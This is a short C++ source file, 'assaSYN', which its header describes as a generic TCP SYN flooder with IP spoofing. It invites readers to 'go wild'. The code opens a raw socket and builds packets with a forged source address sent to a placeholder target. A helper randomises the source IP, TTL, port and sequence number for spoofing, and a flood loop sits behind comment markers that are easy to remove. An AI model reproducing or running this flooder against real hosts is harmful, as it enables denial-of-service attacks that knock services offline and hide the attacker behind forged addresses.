/*
 * assaSYN - by wmax641
 * Generic tcp syn flooder with spoofing
 *
 * Made as an example of how to send raw ip packets
 *
 * Go wild!! Do whatever you want with this
 *
 * Does NOT work on Windows, tested on a 64bit intel (little endian) machine. Have no
 * idea what will happen on big endian systems, might need some tweaking
 */
#include <time.h>
#include <stdlib.h>
#include <iostream>

#include <arpa/inet.h>
#include <sys/socket.h>


#include "Layer3_ip.hpp"
#include "Layer4_tcp.hpp"

#define _DEFAULT_PACKET_BUFFER_LEN 1000

/* Function prototypes */
void randomise_identity(class IP_Hdr& ip_hdr, class TCP_Hdr& tcp_hdr);


int main(void) {

   /* This will house the packet */
   char *buf = (char *)malloc(_DEFAULT_PACKET_BUFFER_LEN);

   srand(time(NULL));

   try {
      /* Create custom ip packet */
      class IP_Hdr ip_hdr(buf);
      ip_hdr.init();
      ip_hdr.src_ip("1.2.3.4"); /* If unset, your host ip will be used */
      ip_hdr.dest_ip("13.37.13.37");

      /* Add TCP onto same buffer */
      class TCP_Hdr tcp_hdr(buf,  ip_hdr.hdr_len());
      tcp_hdr.init();

      int sock;

      /* sendto() requires a dummy address to send to, the actual destination 
       * ip adress has already been set via IP_Hdr::dest_ip() method above */
      struct sockaddr_in dummy;
      dummy.sin_family = AF_INET;
      dummy.sin_port = 0;
      inet_pton(AF_INET, "1.2.3.4", (struct in_addr *)&dummy.sin_addr.s_addr);

      /* Create raw IP socket 
       * The socket will also automatically calculate and set the ip header checksum 
       * when send() or sendto() is used */
      if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("error:");
         return(1);
      }


      /*   ^_^   */

      //while(1) {
         //randomise_identity(ip_hdr, tcp_hdr);
         if(sendto(sock, 
                   buf, 
                   ip_hdr.hdr_len() + tcp_hdr.hdr_len(), 
                   0, (struct sockaddr *)&dummy, (socklen_t)sizeof(dummy))  < 0) {
            perror("error:");
         }
      //}

   } catch (const char *e) {
      std::cerr << "Caught exception" << std::endl;
      std::cerr << e << std::endl;
   }
   return(0);
}

/* Changes some stuff */
void randomise_identity(class IP_Hdr& ip_hdr, class TCP_Hdr& tcp_hdr) {
   ip_hdr.src_ip(rand());
   ip_hdr.ttl(32 + (rand() & 0x3f));

   tcp_hdr.th_sport(10000 + (rand() & 0x7fff) + (rand() & 0x3fff));
   tcp_hdr.th_win(20000 + 200*(rand() & 0x3f ));
   tcp_hdr.th_seq(rand());
   tcp_hdr.recalculate_checksum();
     
}
